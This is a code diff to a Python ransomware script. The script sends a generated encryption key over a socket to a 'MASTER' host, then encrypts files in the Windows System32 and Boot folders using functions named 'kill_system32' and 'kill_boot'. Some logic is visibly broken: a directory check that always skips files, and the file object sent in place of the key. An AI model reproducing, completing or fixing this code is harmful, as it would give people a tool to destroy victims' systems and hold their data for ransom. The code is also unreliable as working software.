@@ -1,7 +1,7 @@
 import os
 from cryptography.fernet import Fernet
 import socket
-import argparse
+import multiprocessing as mp
 
 
 MASTER = "192.168.56.1"
@@ -12,14 +12,15 @@ HEADER = 64
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(ADDR)
 files = []
-
-for file in os.listdir():
-    files.append(file)
-
-#manufacturing encryption key, saving encryption key, sending it to master before finally encrypting
+boot_files = []
+path = r"C:\Windows\System32"
+boot_path = r"C:\Windows\System32\Boot"
 key = Fernet.generate_key()
+
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
+
+#sending key to master
 def send(msg):
     message = msg
     msg_length = len(message)
@@ -29,14 +30,45 @@ def send(msg):
     client.send(message)
     
     
-send(thekey)
-open("backup.txt", "w").write(str(thekey)) 
-
 #finally...going for the kill
-#Fernet(key).encrypt(open(filepath))
-for file in files:
-    with open(file, "rb") as thefile:
-        contents = thefile.read()
-        contents_encrypted = Fernet(key).encrypt(contents)
-        with open(file, "wb") as thefile:
-            thefile.write(contents_encrypted)
+def first_injection():
+    def kill_system32():
+        for file in os.listdir(path):
+            if os.path.isdir:
+                continue
+            files.append(file)
+            
+    kill_system32()
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+            contents_encrypted = Fernet(key).encrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(contents_encrypted)
+                
+def second_injection():
+    def kill_boot():
+        for file in os.listdir(boot_path):
+            if os.path.isdir:
+                continue
+            boot_files.append(file)
+            
+    kill_boot()
+    for file in boot_files:
+        with open(file, "rb") as afile:
+            bcontents = afile.read()
+            bcontents_encrypted = Fernet(key).encrypt(bcontents)
+            with open(file, "wb") as afile:
+                afile.write(bcontents_encrypted)
+                
+                
+                
+if __name__ == '__main__':
+    send(thekey)
+    i_1 = mp.Process(target=first_injection)
+    i_2 = mp.Process(target=second_injection)
+    i_1.start()
+    i_2.start()
+    i_1.join()
+    i_2.join()
+    
